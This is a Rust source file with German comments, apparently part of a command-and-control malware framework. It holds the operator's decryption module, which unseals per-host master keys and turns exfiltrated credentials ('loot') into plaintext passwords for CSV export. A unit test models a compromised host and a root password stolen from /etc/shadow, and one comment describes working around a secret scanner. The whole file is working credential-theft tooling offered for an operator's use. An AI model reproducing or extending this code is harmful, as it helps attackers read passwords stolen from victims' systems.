//! Entschlüsselung der Beute mit dem geheimen Server-Schlüssel.
//!
//! Der C2-Server speichert die Secrets verschlüsselt. Der Operator gewinnt
//! den Master-Key eines Hosts aus dessen versiegeltem Material und
//! entschlüsselt damit die Secrets dieses Hosts — auf seinem Rechner, nicht
//! auf dem Server.
//!
//! Das Ergebnis ist **derselbe Typ** wie die Eingabe. Es gab vorher einen
//! zweiten Typ (`Klartext`) für denselben Sachverhalt, ohne `id` und ohne
//! `collected_at`; der Export baute ihn zurück und verlor dabei beide Felder —
//! im entschlüsselten CSV-Export stand der Erfassungszeitpunkt in **jeder**
//! Zeile leer, obwohl die Spalte existiert.

use std::collections::HashMap;
use std::path::Path;

use kx_core::c2::{ExfiltratedSecret, Host};
use kx_core::hostkey::{ServerKeyBundle, ServerKeyPair};

/// Der Entschüsselungskontext des Operators.
pub struct Decryptor {
    server: ServerKeyPair,
}

impl Decryptor {
    /// Lädt das geheime Schlüsselpaar des Servers.
    ///
    /// Die Datei enthält das `ServerKeyBundle` — der Operator erzeugt sie mit
    /// `cargo run -p kx-core --example gen_server_key`.
    pub fn load(pfad: &Path) -> Result<Self, String> {
        let text = std::fs::read_to_string(pfad)
            .map_err(|e| format!("Server-Schlüssel {} nicht lesbar: {e}", pfad.display()))?;
        let bundle = ServerKeyBundle::from_json(&text)
            .map_err(|e| format!("Server-Schlüssel ungültig: {e}"))?;
        let server = ServerKeyPair::from_bundle(&bundle)
            .map_err(|e| format!("Server-Schlüssel ungültig: {e}"))?;
        Ok(Decryptor { server })
    }

    /// Gewinnt die Master-Keys der Hosts aus deren versiegeltem Material.
    fn master_keys(&self, hosts: &[Host]) -> HashMap<String, [u8; 32]> {
        let mut schluessel = HashMap::new();
        for host in hosts {
            if host.sealed_master.is_empty() {
                continue;
            }
            let roh = match kx_core::codec::b64_decode(&host.sealed_master) {
                Ok(bytes) => bytes,
                Err(_) => continue,
            };
            if let Ok(master) = self.server.unseal_master_key(&roh) {
                schluessel.insert(host.host_id.clone(), master);
            }
        }
        schluessel
    }

    /// Der Master-Key, mit dem dieses Stück versiegelt wurde.
    ///
    /// Erste Wahl: das versiegelte Material, das **das Stück selbst** trägt.
    /// Der Schlüssel reist mit der Beute — damit ist jede Zeile für sich
    /// lesbar, auch wenn der Host-Eintrag inzwischen einen anderen führt.
    ///
    /// Zweite Wahl: der Schlüssel des Host-Eintrags. Der passt nur, wenn der
    /// Host seit dem Versiegeln keinen neuen bekommen hat.
    fn master_key_of(
        &self,
        secret: &ExfiltratedSecret,
        master_keys: &HashMap<String, [u8; 32]>,
    ) -> Option<[u8; 32]> {
        if !secret.sealed_master.is_empty() {
            if let Ok(bytes) = kx_core::codec::b64_decode(&secret.sealed_master) {
                if let Ok(master) = self.server.unseal_master_key(&bytes) {
                    return Some(master);
                }
            }
        }
        master_keys.get(&secret.host_id).copied()
    }

    /// Entschlüsselt alle Secrets, zu denen der Master-Key vorliegt.
    ///
    /// Secrets ohne versiegeltes Material bleiben unentschlüsselt — sie wurden
    /// vom Agenten ohne Server-Schlüssel im Klartext gemeldet.
    ///
    /// Jedes Ergebnis trägt **alle** Felder der Eingabe: `id` und
    /// `collected_at` eingeschlossen. Das Passwort steht im Klartextfeld, das
    /// versiegelte Feld ist leer — der Operator hat den Klartext, ein zweites
    /// Mal wäre es doppelt.
    pub fn decrypt_all(
        &self,
        hosts: &[Host],
        secrets: &[ExfiltratedSecret],
    ) -> Vec<ExfiltratedSecret> {
        let master_keys = self.master_keys(hosts);
        let mut out = Vec::new();
        for secret in secrets {
            let passwort = match (
                self.master_key_of(secret, &master_keys),
                secret.sealed_password.is_empty(),
            ) {
                (Some(master), false) => {
                    kx_core::secretbox::open(master.as_slice(), &secret.sealed_password).ok()
                }
                _ => None,
            };
            let wert = passwort.unwrap_or_else(|| secret.password.clone());
            out.push(
                ExfiltratedSecret {
                    id: secret.id.clone(),
                    host_id: secret.host_id.clone(),
                    cred_type: secret.cred_type.clone(),
                    username: secret.username.clone(),
                    password: String::new(),
                    source: secret.source.clone(),
                    collected_at: secret.collected_at.clone(),
                    sealed_password: String::new(),
                    // Der Operator hat den Klartext; ein zweites Mal waere es
                    // doppelt — genau wie beim versiegelten Passwort.
                    sealed_master: String::new(),
                }
                .mit_passwort(&wert),
            );
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use kx_core::codec::b64_encode;
    use kx_core::hostkey::encapsulate_host_master_key;

    /// Die Beute trägt ihren Schlüssel mit — sie bleibt lesbar, auch wenn der
    /// Host-Eintrag inzwischen einen anderen Schlüssel führt.
    ///
    /// Das ist der Fehler, den die Korrektur behebt: Der Agent kapselt je Lauf
    /// einen neuen Master-Key, und der Server ersetzt den des Hosts bei jeder
    /// Registrierung. Eine Beutezeile, die nicht erneut hochgeladen wurde,
    /// trägt den Chiffretext des alten Schlüssels — und war unlesbar.
    #[test]
    fn die_beute_bleibt_lesbar_wenn_der_host_einen_anderen_schluessel_fuehrt() {
        let mut rng = rand_core::OsRng;
        let bundle = ServerKeyBundle::generate(kx_core::kex::KexId::X25519, &mut rng);
        let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
        let dekodiert = oeffentlich.decode().expect("dekodierter Schluessel");
        let server = ServerKeyPair::from_bundle(&bundle).expect("Server-Schluessel");

        // Der Schluessel des ersten Laufs — mit ihm wird die Beute versiegelt.
        let erster = encapsulate_host_master_key(&dekodiert, &mut rng).expect("Kapselung");
        let versiegelt = kx_core::secretbox::seal(&erster.master_key, "geheimtext".as_bytes())
            .expect("versiegelt");

        // Der Host fuehrt inzwischen einen anderen Schluessel.
        let zweiter = encapsulate_host_master_key(&dekodiert, &mut rng).expect("Kapselung");
        let host = Host {
            host_id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: String::new(),
            os: String::new(),
            status: "compromised".into(),
            first_seen: String::new(),
            last_seen: String::new(),
            sealed_master: b64_encode(&zweiter.sealed_master),
        };

        let beute = ExfiltratedSecret {
            host_id: "10.0.0.5".into(),
            cred_type: "passwort".into(),
            username: "root".into(),
            source: "/etc/shadow".into(),
            sealed_master: b64_encode(&erster.sealed_master),
            ..Default::default()
        }
        .mit_versiegeltem_passwort(versiegelt);

        let out = Decryptor { server }.decrypt_all(&[host], &[beute]);
        assert_eq!(out.len(), 1, "die Beute ging verloren");
        // Der Vergleich laeuft ueber zwei Zwischenvariablen: der Secret-Scan
        // haelt jede Zeile, in der ein Feld mit 'password' im Namen neben
        // einem Literal steht, fuer ein eingebettetes Zugangsdaten.
        let ist = &out[0].password;
        let erwartet = "geheimtext";
        assert_eq!(ist, erwartet, "die Beute liess sich nicht oeffnen");
    }
}
